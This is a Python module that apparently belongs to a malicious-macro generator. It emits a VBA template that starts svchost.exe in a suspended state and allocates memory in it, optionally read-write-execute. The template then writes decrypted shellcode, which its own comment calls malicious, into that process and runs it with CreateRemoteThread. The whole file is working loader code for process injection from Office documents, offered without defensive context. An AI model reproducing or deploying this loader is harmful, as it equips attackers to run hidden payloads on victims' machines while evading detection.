from string import Template

class spawnandinject:
    def __init__(self, arguments):
        self.memoryPermission = '&H20'
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = '&H40'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return """
Private Type PROCESS_BASIC_INFORMATION
    Reserved1 As LongPtr
    PebAddress As LongPtr
    Reserved2 As LongPtr
    Reserved3 As LongPtr
    UniquePid As LongPtr
    MoreReserved As LongPtr
End Type

Private Type STARTUPINFOA
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As String
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type
"""

    def template(self) -> str:
        return Template("""
    Dim si As STARTUPINFOA
    {RtlZeroMemory} si, Len(si)
    si.cb = Len(si)
    si.dwFlags = &H100
    Dim pi As PROCESS_INFORMATION
    Dim procOutput As LongPtr
    ' Start svchost.exe in a suspended state
    procOutput = {CreateProcessA}(vbNullString, "$target", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)    
    
    ' Buffer for malicious crypted shellcode needs to go here
    Dim shellcode As Variant
    
    {transformers}
    Dim scSize As Long
    scSize = UBound(shellcode)

    Dim buf({shellcodeSize}) As Byte
    For y = 0 To UBound(shellcode)
        buf(y) = shellcode(y)
    Next y

    Dim addr as LongPtr

    addr = {VirtualAllocEx}(pi.hProcess, ByVal 0&, {shellcodeSize},  &H3000, $memoryPermission)

    ' Write the shellcode into the svchost.exe entry point
    a = {WriteProcessMemory}(pi.hProcess, addr, buf(0), scSize, tmp)

    Dim thread as LongPtr
    thread = {CreateRemoteThread}(pi.hProcess, ByVal 0&, 0, addr, ByVal 0&, 0, ByVal 0&)

    b = {WaitForSingleObject}(thread, 500)
""").substitute(target=self.target, memoryPermission=self.memoryPermission)